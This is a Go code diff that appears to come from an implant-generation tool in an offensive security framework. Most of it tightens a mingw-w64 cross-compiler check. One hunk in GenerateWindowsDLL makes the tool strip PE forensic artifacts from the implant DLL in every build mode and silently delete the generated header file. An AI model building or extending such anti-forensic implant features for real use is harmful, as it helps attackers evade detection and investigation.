@@ -11,26 +11,38 @@ import (
 )
 
 // checkCgoCrossCompiler returns an error if CGO cross-compilation for
-// windows/amd64 or windows/arm64 is not available on a non-Windows host.
+// windows/amd64 or windows/arm64 is not available. On Windows the native
+// toolchain (or an installed gcc/clang) is used; on other hosts a
+// mingw-w64 cross-compiler must be present. Only real mingw targets are
+// accepted — a generic Linux gcc would pass the check and then fail the
+// build with a confusing error.
 func checkCgoCrossCompiler(goarch string) error {
 	if runtime.GOOS == "windows" {
-		return nil
+		// CGO on Windows needs gcc or clang in PATH (mingw-w64 or
+		// LLVM). Verify it instead of assuming success.
+		for _, name := range []string{"gcc", "clang", "x86_64-w64-mingw32-gcc", "aarch64-w64-mingw32-gcc"} {
+			if _, err := exec.LookPath(name); err == nil {
+				return nil
+			}
+		}
+		return fmt.Errorf("CGO compiler not found: install mingw-w64 (or LLVM clang) and ensure gcc/clang is in PATH, or set CC")
 	}
 	// Look for mingw-w64 cross-compiler (used by Go for CGO cross-builds)
-	// Go needs gcc to be present for CGO cross-compilation.
 	cc := os.Getenv("CC")
 	if cc != "" {
 		if _, err := exec.LookPath(cc); err == nil {
 			return nil
 		}
 	}
-	// Common names for the cross-compiler based on target arch
+	// Common names for the cross-compiler based on target arch. A bare
+	// "gcc" is intentionally NOT accepted: a host gcc cannot produce a
+	// Windows PE and the build would fail later anyway.
 	var candidates []string
 	switch goarch {
 	case "arm64":
-		candidates = []string{"aarch64-w64-mingw32-gcc", "aarch64-w64-mingw32-gcc.exe", "gcc"}
+		candidates = []string{"aarch64-w64-mingw32-gcc", "aarch64-w64-mingw32-gcc.exe"}
 	default:
-		candidates = []string{"x86_64-w64-mingw32-gcc", "x86_64-w64-mingw32-gcc.exe", "gcc"}
+		candidates = []string{"x86_64-w64-mingw32-gcc", "x86_64-w64-mingw32-gcc.exe"}
 	}
 	for _, c := range candidates {
 		if _, err := exec.LookPath(c); err == nil {
@@ -113,12 +125,11 @@ func GenerateWindowsDLL(cfg ImplantConfig, outputDir string) (string, error) {
 		return "", err
 	}
 
-	if !cfg.Obfuscate {
-		stripPEArtifacts(outPath)
-		// Go also generates a .h file alongside the DLL; remove it silently.
-		hPath := strings.TrimSuffix(outPath, ".dll") + ".h"
-		os.Remove(hPath)
-	}
+	// Strip PE forensic artifacts in every mode (garble does not clean them)
+	// and remove the Go-generated .h export header next to the DLL.
+	stripPEArtifacts(outPath)
+	hPath := strings.TrimSuffix(outPath, ".dll") + ".h"
+	os.Remove(hPath)
 
 	if _, err := os.Stat(outPath); err != nil {
 		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
